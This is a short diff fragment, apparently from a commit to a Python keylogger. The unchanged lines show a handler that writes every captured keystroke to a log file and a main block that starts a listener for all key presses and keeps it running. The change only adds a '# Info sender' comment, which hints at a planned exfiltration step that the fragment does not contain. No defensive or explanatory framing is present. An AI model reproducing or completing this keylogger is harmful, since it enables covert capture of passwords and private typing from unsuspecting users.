@@ -12,6 +12,7 @@ def keyPressed(key):
             logKey.write(char)
         except:
             print("Error getting char")
+# Info sender
 
 if __name__ == "__main__":
     # creating a listener for every key pressed
@@ -19,3 +20,4 @@ if __name__ == "__main__":
     listener.start()
     # Keeps the program running
     input()
+
